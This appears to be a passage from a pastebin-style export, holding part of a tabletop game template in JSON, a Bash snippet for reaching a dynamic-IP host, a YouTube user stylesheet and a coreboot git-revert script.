earhands"",""cssClass"":"""",""role"":""0"",""permission"":""0"",""tooltip"":"""",""visibilityFormula"":"""",""rowLayout"":[{""key"":""bonus"",""cssClass"":"""",""role"":""0"",""permission"":""0"",""tooltip"":"""",""visibilityFormula"":"""",""label"":null,""defaultValue"":null,""size"":""full-size"",""icon"":"""",""value"":""${item.bonus}$"",""prefix"":"""",""suffix"":"""",""rollMessage"":"""",""altRollMessage"":"""",""style"":""label"",""type"":""label"",""align"":""center"",""colName"":""Bonus""},{""key"":""2hand"",""cssClass"":"""",""role"":""0"",""permission"":""0"",""tooltip"":""Two-handed?"",""visibilityFormula"":"""",""label"":null,""defaultValue"":null,""size"":""full-size"",""icon"":"""",""value"":""${item.hands ? \""Y\"" : \""N\""}$"",""prefix"":"""",""suffix"":"""",""rollMessage"":"""",""altRollMessage"":"""",""style"":""label"",""type"":""label"",""align"":""center"",""colName"":""2H""}],""head"":false,""deleteWarning"":false,""headDisplay"":true,""showDelete"":true,""nameAlign"":""left"",""nameLabel"":""Name"",""templateFilter"":[""Jv5vhxRp4qHoWFpk""],""itemFilter"":[{""prop"":""loc"",""operator"":""eq"",""value"":""hands""}],""type"":""itemContainer""},{""key"":""gearbeltlabel"",""cssClass"":"""",""role"":""0"",""permission"":""0"",""tooltip"":"""",""visibilityFormula"":"""",""label"":null,""defaultValue"":null,""size"":""full-size"",""icon"":"""",""value"":""Belt"",""prefix"":"""",""suffix"":"""",""rollMessage"":"""",""altRollMessage"":"""",""style"":""title"",""type"":""label""},{""key"":""gearbelt"",""cssClass"":"""",""role"":""0"",""permission"":""0"",""tooltip"":"""",""visibilityFormula"":"""",""rowLayout"":[{""key"":""bonus"",""cssClass"":"""",""role"":""0"",""permission"":""0"",""tooltip"":"""",""visibilityFormula"":"""",""label"":null,""defaultValue"":null,""size"":""full-size"",""icon"":"""",""value"":""${item.bonus}$"",""prefix"":"""",""suffix"":"""",""rollMessage"":"""",""altRollMessage"":"""",""style"":""label"",""type"":""label"",""align"":""center"",""colName"":""Bonus""},{""key"":""2hands"",""cssClass"":"""",""role"":""0"",""permission"":""0"",""tooltip"":""Two-handed?"",""visibilityFormula"":"""",""label"":null,""defaultValue"":null,""size"":""full-size"",""icon"":"""",""value"":""${item.hands ? \""Y\"" : \""N\""}$"",""prefix"":"""",""suffix"":"""",""rollMessage"":"""",""altRollMessage"":"""",""style"":""label"",""type"":""label"",""align"":""center"",""colName"":""2H""}],""head"":false,""deleteWarning"":false,""headDisplay"":true,""showDelete"":true,""nameAlign"":""left"",""nameLabel"":""Name"",""templateFilter"":[""Jv5vhxRp4qHoWFpk""],""itemFilter"":[{""prop"":""loc"",""operator"":""eq"",""value"":""belt""}],""type"":""itemContainer""},{""key"":""gearwornlabel"",""cssClass"":"""",""role"":""0"",""permission"":""0"",""tooltip"":"""",""visibilityFormula"":"""",""label"":null,""defaultValue"":null,""size"":""full-size"",""icon"":"""",""value"":""Worn"",""prefix"":"""",""suffix"":"""",""rollMessage"":"""",""altRollMessage"":"""",""style"":""title"",""type"":""label""},{""key"":""gearworn"",""cssClass"":"""",""role"":""0"",""permission"":""0"",""tooltip"":"""",""visibilityFormula"":"""",""rowLayout"":[{""key"":""bonus"",""cssClass"":"""",""role"":""0"",""permission"":""0"",""tooltip"":"""",""visibilityFormula"":"""",""label"":null,""defaultValue"":null,""size"":""full-size"",""icon"":"""",""value"":""${item.bonus}$"",""prefix"":"""",""suffix"":"""",""rollMessage"":"""",""altRollMessage"":"""",""style"":""label"",""type"":""label"",""align"":""center"",""colName"":""Bonus""},{""key"":""2hands"",""cssClass"":"""",""role"":""0"",""permission"":""0"",""tooltip"":""Two-handed?"",""visibilityFormula"":"""",""label"":null,""defaultValue"":null,""size"":""full-size"",""icon"":"""",""value"":""${item.hands ? \""Y\"" : \""N\""}$"",""prefix"":"""",""suffix"":"""",""rollMessage"":"""",""altRollMessage"":"""",""style"":""label"",""type"":""label"",""align"":""center"",""colName"":""2H""}],""head"":false,""deleteWarning"":false,""headDisplay"":true,""showDelete"":true,""nameAlign"":""left"",""nameLabel"":""Name"",""templateFilter"":[""Jv5vhxRp4qHoWFpk""],""itemFilter"":[{""prop"":""loc"",""operator"":""eq"",""value"":""worn""}],""type"":""itemContainer""},{""key"":""gearbackpacklabel"",""cssClass"":"""",""role"":""0"",""permission"":""0"",""tooltip"":"""",""visibilityFormula"":"""",""label"":null,""defaultValue"":null,""size"":""full-size"",""icon"":"""",""value"":""Backpack"",""prefix"":"""",""suffix"":"""",""rollMessage"":"""",""altRollMessage"":"""",""style"":""title"",""type"":""label""},{""key"":""gearbackpack"",""cssClass"":"""",""role"":""0"",""permission"":""0"",""tooltip"":"""",""visibilityFormula"":"""",""rowLayout"":[{""key"":""bonus"",""cssClass"":"""",""role"":""0"",""permission"":""0"",""tooltip"":"""",""visibilityFormula"":"""",""label"":null,""defaultValue"":null,""size"":""full-size"",""icon"":"""",""value"":""${item.bonus}$"",""prefix"":"""",""suffix"":"""",""rollMessage"":"""",""altRollMessage"":"""",""style"":""label"",""type"":""label"",""align"":""center"",""colName"":""Bonus""},{""key"":""2hands"",""cssClass"":"""",""role"":""0"",""permission"":""0"",""tooltip"":""Two-handed?"",""visibilityFormula"":"""",""label"":null,""defaultValue"":null,""size"":""full-size"",""icon"":"""",""value"":""${item.hands ? \""Y\"" : \""N\""}$"",""prefix"":"""",""suffix"":"""",""rollMessage"":"""",""altRollMessage"":"""",""style"":""label"",""type"":""label"",""align"":""center"",""colName"":""2H""}],""head"":false,""deleteWarning"":false,""headDisplay"":true,""showDelete"":true,""nameAlign"":""left"",""nameLabel"":""Name"",""templateFilter"":[""Jv5vhxRp4qHoWFpk""],""itemFilter"":[{""prop"":""loc"",""operator"":""eq"",""value"":""backpack""}],""type"":""itemContainer""}],""flow"":""vertical"",""align"":""left"",""type"":""panel""}],""flow"":""horizontal"",""align"":""center"",""type"":""panel""}],""key"":""custom_body"",""cssClass"":null,""role"":0,""permission"":0,""tooltip"":null,""visibilityFormula"":null,""flow"":null,""align"":null,""type"":""panel""},""display"":{""width"":""600"",""height"":""600"",""fix_size"":false,""pp_width"":""64"",""pp_height"":""64""},""attributeBar"":{},""activeEffects"":{},""templateSystemUniqueVersion"":3625967792},""flags"":{""custom-system-builder"":{""version"":""2.3.0"",""templateHistory"":[[{""kind"":""E"",""path"":[""body"",""contents"",0,""contents"",1,""contents"",0,""contents"",0,""icon""],""lhs"":"""",""rhs"":""fas fa-dice-d20""}],[{""kind"":""E"",""path"":[""body"",""contents"",0,""contents"",1,""contents"",0,""contents"",0,""icon""],""lhs"":""fas fa-dice-d20"",""rhs"":""fas fa-dice""}],null,[{""kind"":""E"",""path"":[""body"",""contents"",0,""contents"",0,""contents"",0,""contents"",0,""icon""],""lhs"":"""",""rhs"":""fas fa-dice""}],[{""kind"":""E"",""path"":[""body"",""contents"",0,""contents"",0,""contents"",1,""contents"",0,""icon""],""lhs"":"""",""rhs"":""fas fa-dice""}],[{""kind"":""E"",""path"":[""body"",""contents"",0,""contents"",0,""contents"",2,""contents"",0,""icon""],""lhs"":"""",""rhs"":""fas fa-dice""}],[{""kind"":""E"",""path"":[""body"",""contents"",0,""contents"",1,""contents"",1,""contents"",0,""icon""],""lhs"":"""",""rhs"":""fas fa-comments""}],null,[{""kind"":""E"",""path"":[""body"",""contents"",0,""contents"",1,""contents"",2,""contents"",0,""icon""],""lhs"":"""",""rhs"":""fas fa-comments""}],null],""templateHistoryRedo"":[]}}}],""items"":[{""type"":""_equippableItemTemplate"",""name"":""Gear"",""data"":{""hidden"":[],""header"":{""contents"":[{""key"":""flagspanel"",""cssClass"":"""",""role"":""0"",""permission"":""0"",""tooltip"":"""",""visibilityFormula"":"""",""contents"":[{""key"":""loc"",""cssClass"":"""",""role"":""0"",""permission"":""0"",""tooltip"":"""",""visibilityFormula"":"""",""label"":""Location"",""defaultValue"":""backpack"",""size"":""full-size"",""options"":[{""key"":""hands"",""value"":""Hands""},{""key"":""belt"",""value"":""Belt""},{""key"":""worn"",""value"":""Worn""},{""key"":""backpack"",""value"":""Backpack""}],""tableKey"":null,""tableKeyColumn"":null,""tableLabelColumn"":null,""type"":""select""},{""key"":""hands"",""cssClass"":"""",""role"":""0"",""permission"":""0"",""tooltip"":"""",""visibilityFormula"":"""",""label"":""Two-handed?"",""defaultValue"":null,""size"":""full-size"",""type"":""checkbox""},{""key"":""bonus"",""cssClass"":"""",""role"":""0"",""permission"":""0"",""tooltip"":"""",""visibilityFormula"":"""",""label"":""Bonus"",""defaultValue"":"""",""size"":""full-size"",""charList"":"""",""maxLength"":"""",""type"":""textField""}],""flow"":""horizontal"",""align"":""center"",""type"":""panel""}],""key"":""custom_header"",""cssClass"":null,""role"":0,""permission"":0,""tooltip"":null,""visibilityFormula"":null,""flow"":null,""align"":null,""type"":""panel""},""body"":{""contents"":[{""key"":""description"",""cssClass"":"""",""role"":""0"",""permission"":""0"",""tooltip"":"""",""visibilityFormula"":"""",""label"":""Description"",""defaultValue"":"""",""size"":null,""style"":""sheet"",""type"":""textArea""}],""key"":""custom_body"",""cssClass"":null,""role"":0,""permission"":0,""tooltip"":null,""visibilityFormula"":null,""flow"":null,""align"":null,""type"":""panel""},""display"":{""width"":""600"",""height"":""600"",""fix_size"":false,""pp_width"":""64"",""pp_height"":""64""},""templateSystemUniqueVersion"":269327251},""flags"":{""custom-system-builder"":{""version"":""2.3.0"",""templateHistory"":[[{""kind"":""A"",""path"":[""header"",""contents"",0,""contents""],""index"":2,""item"":{""kind"":""N"",""rhs"":{""key"":""damagebonus"",""cssClass"":"""",""role"":""0"",""permission"":""0"",""tooltip"":"""",""visibilityFormula"":"""",""label"":""Damage bonus"",""defaultValue"":""0"",""size"":""m-large"",""allowDecimal"":false,""minVal"":""0"",""maxVal"":"""",""allowRelative"":false,""showControls"":false,""type"":""numberField""}}},{""kind"":""A"",""path"":[""body"",""contents""],""index"":1,""item"":{""kind"":""D"",""lhs"":{""key"":""description"",""cssClass"":"""",""role"":""0"",""permission"":""0"",""tooltip"":"""",""visibilityFormula"":"""",""label"":""Description"",""defaultValue"":"""",""size"":null,""style"":""sheet"",""type"":""textArea""}}},{""kind"":""E"",""path"":[""body"",""contents"",0,""key""],""lhs"":""damagebonus"",""rhs"":""description""},{""kind"":""E"",""path"":[""body"",""contents"",0,""label""],""lhs"":""Damage bonus"",""rhs"":""Description""},{""kind"":""E"",""path"":[""body"",""contents"",0,""defaultValue""],""lhs"":""0"",""rhs"":""""},{""kind"":""E"",""path"":[""body"",""contents"",0,""size""],""lhs"":""m-large"",""rhs"":null},{""kind"":""D"",""path"":[""body"",""contents"",0,""allowDecimal""],""lhs"":false},{""kind"":""D"",""path"":[""body"",""contents"",0,""minVal""],""lhs"":""0""},{""kind"":""D"",""path"":[""body"",""contents"",0,""maxVal""],""lhs"":""""},{""kind"":""D"",""path"":[""body"",""contents"",0,""allowRelative""],""lhs"":false},{""kind"":""D"",""path"":[""body"",""contents"",0,""showControls""],""lhs"":false},{""kind"":""E"",""path"":[""body"",""contents"",0,""type""],""lhs"":""numberField"",""rhs"":""textArea""},{""kind"":""N"",""path"":[""body"",""contents"",0,""style""],""rhs"":""sheet""}],[{""kind"":""E"",""path"":[""header"",""contents"",0,""contents"",2,""size""],""lhs"":""m-large"",""rhs"":""full-size""}],[{""kind"":""A"",""path"":[""body"",""contents""],""index"":1,""item"":{""kind"":""N"",""rhs"":{""key"":""loc"",""cssClass"":"""",""role"":""0"",""permission"":""0"",""tooltip"":"""",""visibilityFormula"":"""",""label"":""Location"",""defaultValue"":""backpack"",""size"":""full-size"",""options"":[{""key"":""hands"",""value"":""Hands""},{""key"":""belt"",""value"":""Belt""},{""key"":""worn"",""value"":""Worn""},{""key"":""backpack"",""value"":""Backpack""}],""tableKey"":null,""tableKeyColumn"":null,""tableLabelColumn"":null,""type"":""select""}}}],[{""kind"":""E"",""path"":[""body"",""contents"",1,""key""],""lhs"":""loc"",""rhs"":""description""},{""kind"":""E"",""path"":[""body"",""contents"",1,""label""],""lhs"":""Location"",""rhs"":""Description""},{""kind"":""E"",""path"":[""body"",""contents"",1,""defaultValue""],""lhs"":""backpack"",""rhs"":""""},{""kind"":""E"",""path"":[""body"",""contents"",1,""size""],""lhs"":""full-size"",""rhs"":null},{""kind"":""D"",""path"":[""body"",""contents"",1,""options""],""lhs"":[{""key"":""hands"",""value"":""Hands""},{""key"":""belt"",""value"":""Belt""},{""key"":""worn"",""value"":""Worn""},{""key"":""backpack"",""value"":""Backpack""}]},{""kind"":""D"",""path"":[""body"",""contents"",1,""tableKey""],""lhs"":null},{""kind"":""D"",""path"":[""body"",""contents"",1,""tableKeyColumn""],""lhs"":null},{""kind"":""D"",""path"":[""body"",""contents"",1,""tableLabelColumn""],""lhs"":null},{""kind"":""E"",""path"":[""body"",""contents"",1,""type""],""lhs"":""select"",""rhs"":""textArea""},{""kind"":""N"",""path"":[""body"",""contents"",1,""style""],""rhs"":""sheet""},{""kind"":""E"",""path"":[""body"",""contents"",0,""key""],""lhs"":""description"",""rhs"":""loc""},{""kind"":""E"",""path"":[""body"",""contents"",0,""label""],""lhs"":""Description"",""rhs"":""Location""},{""kind"":""E"",""path"":[""body"",""contents"",0,""defaultValue""],""lhs"":"""",""rhs"":""backpack""},{""kind"":""E"",""path"":[""body"",""contents"",0,""size""],""lhs"":null,""rhs"":""full-size""},{""kind"":""D"",""path"":[""body"",""contents"",0,""style""],""lhs"":""sheet""},{""kind"":""E"",""path"":[""body"",""contents"",0,""type""],""lhs"":""textArea"",""rhs"":""select""},{""kind"":""N"",""path"":[""body"",""contents"",0,""options""],""rhs"":[{""key"":""hands"",""value"":""Hands""},{""key"":""belt"",""value"":""Belt""},{""key"":""worn"",""value"":""Worn""},{""key"":""backpack"",""value"":""Backpack""}]},{""kind"":""N"",""path"":[""body"",""contents"",0,""tableKey""],""rhs"":null},{""kind"":""N"",""path"":[""body"",""contents"",0,""tableKeyColumn""],""rhs"":null},{""kind"":""N"",""path"":[""body"",""contents"",0,""tableLabelColumn""],""rhs"":null}],[{""kind"":""A"",""path"":[""header"",""contents"",0,""contents""],""index"":2,""item"":{""kind"":""D"",""lhs"":{""key"":""damagebonus"",""cssClass"":"""",""role"":""0"",""permission"":""0"",""tooltip"":"""",""visibilityFormula"":"""",""label"":""Damage bonus"",""defaultValue"":""0"",""size"":""full-size"",""allowDecimal"":false,""minVal"":""0"",""maxVal"":"""",""allowRelative"":false,""showControls"":false,""type"":""numberField""}}},{""kind"":""E"",""path"":[""header"",""contents"",0,""contents"",1,""key""],""lhs"":""equipped"",""rhs"":""damagebonus""},{""kind"":""E"",""path"":[""header"",""contents"",0,""contents"",1,""label""],""lhs"":""Equipped?"",""rhs"":""Damage bonus""},{""kind"":""E"",""path"":[""header"",""contents"",0,""contents"",1,""defaultValue""],""lhs"":null,""rhs"":""0""},{""kind"":""E"",""path"":[""header"",""contents"",0,""contents"",1,""type""],""lhs"":""checkbox"",""rhs"":""numberField""},{""kind"":""N"",""path"":[""header"",""contents"",0,""contents"",1,""allowDecimal""],""rhs"":false},{""kind"":""N"",""path"":[""header"",""contents"",0,""contents"",1,""minVal""],""rhs"":""0""},{""kind"":""N"",""path"":[""header"",""contents"",0,""contents"",1,""maxVal""],""rhs"":""""},{""kind"":""N"",""path"":[""header"",""contents"",0,""contents"",1,""allowRelative""],""rhs"":false},{""kind"":""N"",""path"":[""header"",""contents"",0,""contents"",1,""showControls""],""rhs"":false}],[{""kind"":""A"",""path"":[""header"",""contents"",0,""contents""],""index"":2,""item"":{""kind"":""N"",""rhs"":{""key"":""damagebonus"",""cssClass"":"""",""role"":""0"",""permission"":""0"",""tooltip"":"""",""visibilityFormula"":"""",""label"":""Damage bonus"",""defaultValue"":""0"",""size"":""full-size"",""allowDecimal"":false,""minVal"":""0"",""maxVal"":"""",""allowRelative"":false,""showControls"":false,""type"":""numberField""}}},{""kind"":""E"",""path"":[""header"",""contents"",0,""contents"",1,""key""],""lhs"":""damagebonus"",""rhs"":""2hand""},{""kind"":""E"",""path"":[""header"",""contents"",0,""contents"",1,""label""],""lhs"":""Damage bonus"",""rhs"":""Two-handed?""},{""kind"":""E"",""path"":[""header"",""contents"",0,""contents"",1,""defaultValue""],""lhs"":""0"",""rhs"":null},{""kind"":""D"",""path"":[""header"",""contents"",0,""contents"",1,""allowDecimal""],""lhs"":false},{""kind"":""D"",""path"":[""header"",""contents"",0,""contents"",1,""minVal""],""lhs"":""0""},{""kind"":""D"",""path"":[""header"",""contents"",0,""contents"",1,""maxVal""],""lhs"":""""},{""kind"":""D"",""path"":[""header"",""contents"",0,""contents"",1,""allowRelative""],""lhs"":false},{""kind"":""D"",""path"":[""header"",""contents"",0,""contents"",1,""showControls""],""lhs"":false},{""kind"":""E"",""path"":[""header"",""contents"",0,""contents"",1,""type""],""lhs"":""numberField"",""rhs"":""checkbox""},{""kind"":""E"",""path"":[""header"",""contents"",0,""contents"",0,""key""],""lhs"":""2hand"",""rhs"":""loc""},{""kind"":""E"",""path"":[""header"",""contents"",0,""contents"",0,""label""],""lhs"":""Two-handed?"",""rhs"":""Location""},{""kind"":""E"",""path"":[""header"",""contents"",0,""contents"",0,""defaultValue""],""lhs"":null,""rhs"":""backpack""},{""kind"":""E"",""path"":[""header"",""contents"",0,""contents"",0,""type""],""lhs"":""checkbox"",""rhs"":""select""},{""kind"":""N"",""path"":[""header"",""contents"",0,""contents"",0,""options""],""rhs"":[{""key"":""hands"",""value"":""Hands""},{""key"":""belt"",""value"":""Belt""},{""key"":""worn"",""value"":""Worn""},{""key"":""backpack"",""value"":""Backpack""}]},{""kind"":""N"",""path"":[""header"",""contents"",0,""contents"",0,""tableKey""],""rhs"":null},{""kind"":""N"",""path"":[""header"",""contents"",0,""contents"",0,""tableKeyColumn""],""rhs"":null},{""kind"":""N"",""path"":[""header"",""contents"",0,""contents"",0,""tableLabelColumn""],""rhs"":null},{""kind"":""A"",""path"":[""body"",""contents""],""index"":1,""item"":{""kind"":""D"",""lhs"":{""key"":""description"",""cssClass"":"""",""role"":""0"",""permission"":""0"",""tooltip"":"""",""visibilityFormula"":"""",""label"":""Description"",""defaultValue"":"""",""size"":null,""style"":""sheet"",""type"":""textArea""}}},{""kind"":""E"",""path"":[""body"",""contents"",0,""key""],""lhs"":""loc"",""rhs"":""description""},{""kind"":""E"",""path"":[""body"",""contents"",0,""label""],""lhs"":""Location"",""rhs"":""Description""},{""kind"":""E"",""path"":[""body"",""contents"",0,""defaultValue""],""lhs"":""backpack"",""rhs"":""""},{""kind"":""E"",""path"":[""body"",""contents"",0,""size""],""lhs"":""full-size"",""rhs"":null},{""kind"":""D"",""path"":[""body"",""contents"",0,""options""],""lhs"":[{""key"":""hands"",""value"":""Hands""},{""key"":""belt"",""value"":""Belt""},{""key"":""worn"",""value"":""Worn""},{""key"":""backpack"",""value"":""Backpack""}]},{""kind"":""D"",""path"":[""body"",""contents"",0,""tableKey""],""lhs"":null},{""kind"":""D"",""path"":[""body"",""contents"",0,""tableKeyColumn""],""lhs"":null},{""kind"":""D"",""path"":[""body"",""contents"",0,""tableLabelColumn""],""lhs"":null},{""kind"":""E"",""path"":[""body"",""contents"",0,""type""],""lhs"":""select"",""rhs"":""textArea""},{""kind"":""N"",""path"":[""body"",""contents"",0,""style""],""rhs"":""sheet""}],[{""kind"":""E"",""path"":[""header"",""contents"",0,""contents"",1,""key""],""lhs"":""2hand"",""rhs"":""hands""}],null,[{""kind"":""E"",""path"":[""header"",""contents"",0,""contents"",2,""key""],""lhs"":""damagebonus"",""rhs"":""bonus""},{""kind"":""E"",""path"":[""header"",""contents"",0,""contents"",2,""defaultValue""],""lhs"":""0"",""rhs"":""""},{""kind"":""D"",""path"":[""header"",""contents"",0,""contents"",2,""allowDecimal""],""lhs"":false},{""kind"":""D"",""path"":[""header"",""contents"",0,""contents"",2,""minVal""],""lhs"":""0""},{""kind"":""D"",""path"":[""header"",""contents"",0,""contents"",2,""maxVal""],""lhs"":""""},{""kind"":""D"",""path"":[""header"",""contents"",0,""contents"",2,""allowRelative""],""lhs"":false},{""kind"":""D"",""path"":[""header"",""contents"",0,""contents"",2,""showControls""],""lhs"":false},{""kind"":""E"",""path"":[""header"",""contents"",0,""contents"",2,""type""],""lhs"":""numberField"",""rhs"":""textField""},{""kind"":""N"",""path"":[""header"",""contents"",0,""contents"",2,""charList""],""rhs"":""""},{""kind"":""N"",""path"":[""header"",""contents"",0,""contents"",2,""maxLength""],""rhs"":""""}],[{""kind"":""E"",""path"":[""header"",""contents"",0,""contents"",2,""label""],""lhs"":""Damage bonus"",""rhs"":""Bonus""}]],""templateHistoryRedo"":[]},""core"":{""sourceId"":""Item.Jv5vhxRp4qHoWFpk""}}},{""type"":""_equippableItemTemplate"",""name"":""Spell"",""data"":{""hidden"":[],""header"":{""contents"":[],""key"":""custom_header"",""cssClass"":null,""role"":0,""permission"":0,""tooltip"":null,""visibilityFormula"":null,""flow"":null,""align"":null,""type"":""panel""},""body"":{""contents"":[{""key"":""description"",""cssClass"":"""",""role"":""0"",""permission"":""0"",""tooltip"":"""",""visibilityFormula"":"""",""label"":""Description"",""defaultValue"":"""",""size"":null,""style"":""sheet"",""type"":""textArea""}],""key"":""custom_body"",""cssClass"":null,""role"":0,""permission"":0,""tooltip"":null,""visibilityFormula"":null,""flow"":null,""align"":null,""type"":""panel""},""display"":{""width"":""600"",""height"":""600"",""fix_size"":false,""pp_width"":""64"",""pp_height"":""64""},""templateSystemUniqueVersion"":4004400759},""flags"":{""custom-system-builder"":{""version"":""2.3.0"",""templateHistory"":[[{""kind"":""N"",""path"":[""header"",""cssClass""],""rhs"":null},{""kind"":""N"",""path"":[""header"",""role""],""rhs"":0},{""kind"":""N"",""path"":[""header"",""permission""],""rhs"":0},{""kind"":""N"",""path"":[""header"",""tooltip""],""rhs"":null},{""kind"":""N"",""path"":[""header"",""visibilityFormula""],""rhs"":null},{""kind"":""N"",""path"":[""header"",""flow""],""rhs"":null},{""kind"":""N"",""path"":[""header"",""align""],""rhs"":null},{""kind"":""N"",""path"":[""header"",""type""],""rhs"":""panel""},{""kind"":""A"",""path"":[""body"",""contents""],""index"":0,""item"":{""kind"":""N"",""rhs"":{""key"":""description"",""cssClass"":"""",""role"":""0"",""permission"":""0"",""tooltip"":"""",""visibilityFormula"":"""",""label"":""Description"",""defaultValue"":"""",""size"":null,""style"":""sheet"",""type"":""textArea""}}},{""kind"":""N"",""path"":[""body"",""cssClass""],""rhs"":null},{""kind"":""N"",""path"":[""body"",""role""],""rhs"":0},{""kind"":""N"",""path"":[""body"",""permission""],""rhs"":0},{""kind"":""N"",""path"":[""body"",""tooltip""],""rhs"":null},{""kind"":""N"",""path"":[""body"",""visibilityFormula""],""rhs"":null},{""kind"":""N"",""path"":[""body"",""flow""],""rhs"":null},{""kind"":""N"",""path"":[""body"",""align""],""rhs"":null},{""kind"":""N"",""path"":[""body"",""type""],""rhs"":""panel""}]],""templateHistoryRedo"":[]},""core"":{""sourceId"":""Item.rjtXaVTTX4zXVwoN""}}}]}"
8Ktc1D7p,Dynamic IP remote access,pilasguru,Bash,Thursday 27th of July 2023 05:12:33 AM CDT,"# en ORIGEN con dynamicIP se ejecuta periodicamente:
echo $(curl -4 -s icanhazip.com) | ssh server 'cat > /tmp/ip' 

# desde SERVER con IP fija se accede con:
server# ssh user@$(cat /tmp/ip)"
StJkNKeZ,"YouTube Stylesheet - Large ""Show less"" Button",lednerg,JavaScript,Thursday 27th of July 2023 04:57:02 AM CDT,"/* ==UserStyle==
@name           YouTube - Large ""Show less"" Button
@namespace      lednerg
@version        23.7.27
@description    Turns the right half of the description box into a large ""Show less"" button.
@author         lednerg
==/UserStyle== */

/*  I got tired of having to scroll down to find the ""Show less"" button, so I
    made this. It lets you collapse the description box by clicking the right
    half of it. The button itself becomes visible when hovering over it. Any
    links on top of the button will remain clickable, text will be selectable. */

@-moz-document domain(""youtube.com"") {
    /* ""Show more"" text */
    ytd-watch-metadata[description-collapsed] tp-yt-paper-button#expand {
        opacity: 0.2;
        transition: opacity .5s;
    }
    /* ""Show more"" text when hovered */
    ytd-watch-metadata[description-collapsed] #description:hover tp-yt-paper-button#expand {
        opacity: 1;
        transition: opacity .125s;
    }
    /* Puts some space before the ""Show more"" text */
    ytd-watch-metadata[description-collapsed] tp-yt-paper-button#expand:before {
        content: ""   ""
    }
    /* ""Show less"" button location, size, coloring, etc */
    ytd-watch-metadata:not([description-collapsed]) tp-yt-paper-button#collapse {
        color: transparent !important; /* hides original ""Show less"" text */
        position: absolute !important;
        bottom: 0% !important;
        right: 0% !important;
        height: 100%;
        width: 50%;
        opacity: 0.2;
        transition: opacity .5s;
        z-index: 0;
        border-radius: 0;
    }
    /* ""Show less"" button when hovered */
    ytd-watch-metadata:not([description-collapsed]) tp-yt-paper-button#collapse:hover {
        background: linear-gradient(90deg, #9990 0%, #9992 22%, #9993 45%, #9993 55%, #9992 78%, #9990 100%); 
        transition: opacity .125s;
        opacity: 1; 
    }
    /* ""Show less"" text */
    ytd-watch-metadata:not([description-collapsed]) tp-yt-paper-button#collapse:before {
        color: #fff !important;
        content: ""Show less"";
        position: absolute;
        bottom: 0;
        text-align: center;
        width: 100%;
    }
    /* ""Show less"" text when hovered */
    ytd-watch-metadata:not([description-collapsed]) tp-yt-paper-button#collapse:hover:before {
        opacity: 1 !important;
        transition: opacity .25s;
    }
    /* Allows links, Chapters, Key Moments, etc to be clicked under ""Show less"" button*/
    ytd-watch-metadata:not([description-collapsed]) #description a,
    ytd-watch-metadata:not([description-collapsed]) #description span,
    ytd-watch-metadata:not([description-collapsed]) #description .yt-formatted-string,
    ytd-watch-metadata:not([description-collapsed]) div[slot=""extra-content""] * {
        position: relative !important;
        z-index: 1 !important;
    }
    /* Move ""Show less"" down while open so it doesn't collide with text. */
    ytd-watch-metadata:not([description-collapsed]) ytd-text-inline-expander {
        min-height: 20px;
        padding-bottom: 20px;
        margin-top: -20px;
        padding-top: 20px;
    }
}"
7F359EJu,corefinal,MrRockchip,Bash,Thursday 27th of July 2023 04:54:08 AM CDT,"#!/bin/sh

#
# GRF = git revert failure
# TLF = toolchain failure
# CBF = coreboot build failure
#

#
# git reset --hard d8f669ef555e60cd0785bd5a56d2fff947cc27d8 #  3707 # - this is a coreboot master at the moment
#

git revert eb2897b113a04229c7749d1c23990c984775ca13 #  3703 # GRF # mb/samsung/lumpy: override SMBus subsystem ID
git revert 6974bcd28e740c61b80fd4c98311fc5ee8c429ea #  3702 # GRF # mb/google/parrot: override SMBus subsystem ID
git revert a6076cfcfdbe46e81e598e4761eb5d4c4a4082ab #  3701 # GRF # mb/google/butterfly: override SMBus subsystem ID
git revert 2e3cb639258fcc63816e3e0f0c5ec468931bf2a4 #  3667 # GRF # acpi.c: Add functions to create GTDT
git revert 92a3b67eaea08b54252a5f18b53ce3e287380365 #  3659 # GRF # acpi/acpi.c: Split of ACPI table generation into separate files
git revert b096d625d53cfc5bf2dbc38310427efa7521001d #  3617 # GRF # soc/intel/xeon_sp: Introduce soc_cpu_is_enabled
git revert 8554954f9cf23d3858f2826ac11c1d026b8faece #  3608 # GRF # nb/intel/i945: Rework nb resource reading
git revert 9ab8a78d7e37c92fb0e59b511dd3ae20f6478002 #  3604 # GRF # soc/amd/common/acpimmio: factor out IO port access to PM registers
git revert 5bd68097cbb850552d6ec440118c409612e034f4 #  3597 # CBF # soc/amd/common/acpimmio/mmio_util: drop enable_acpimmio_decode_pm24
git revert ebafd4b905d913c37274ce97ff21c8f26ffabd78 #  3572 # GRF # util/crossgcc: Update GCC version from 11.3 to 11.4
git revert ca0436f7c134e565cb83878efe4d4d4a9ef160f4 #  3514 # GRF # nb/intel/x4x: Rework nb resource reading
git revert 90753398b6e394efedae423004648d5f7c303fd4 #  3510 # GRF # util/crossgcc: Fix broken link by Intel to acpica tarball
git revert a959f0ad7620e2e8b13b51c34f7397caf53e9a5f #  3491 # GRF # allocator_v4: Disable top-down allocation for EDK2
git revert 0bcdd40d789236aff2c205511dfc962a76a7c3be #  3477 # GRF # acpi/acpi.c: Fix regression with DSDT
git revert adb80075151f5bb79b591cfafc54f4196fa7d353 #  3440 # GRF # acpi/acpi.c: Move ACPI header creation to a function
git revert 01af0f8ac80384d23abc99860f2c5d605a1aa540 #  3439 # GRF # acpi/acpi.c: Reduce boilerplate
git revert afa5383fdced8829689894a1833162b7361d9224 #  3402 # GRF # crossgcc: Upgrade IASL from 20230331 to 20230628
git revert 0754e00ace632c4a9e22670da3d676d6e9352aa2 #  3339 # GRF # allocator_v4: Fix top-level allocations w/o IORESOURCE_ABOVE_4G
git revert 866eff06edb962633723295b36b89a80befb757d #  3332 # GRF # allocator_v4: Manually inline some thin functions
git revert ee57065daddf0ae42851472e40da0b812c95a397 #  3331 # GRF # allocator_v4: Factor resource printing out
git revert 9260ea60bfa487851e6afda59d83214a0c967208 #  3330 # GRF # allocator_v4: Use memranges only for toplevel
git revert 5226301765ded70e0ef640e5252bbaca8cd14451 #  3329 # GRF # allocator_v4: Treat above 4G resources more natively
git revert f9ee87ffbf6e7e5d7870bd3617c5a3368ac41c54 #  3252 # GRF # acpi/acpi.h: Remove global acpi_fill_ivrs_ioapic()
git revert 9362dd75d805fea8bc95ff58d5abd42cbbb4c36a #  3226 # GRF # acpi/acpi.c: Reduce scope of functions used locally
git revert 8cab80c84f2be22e1f45a2b31c8019695b70abb2 #  3158 # GRF # soc/amd/common/acpi: move acpi_fill_root_complex_tom to Stoneyridge
git revert 1c3849d5dc327866fc5f9e8805022b0f37d930a4 #  3124 # GRF # Documentation: Move 4.20 release notes to 4.20.1
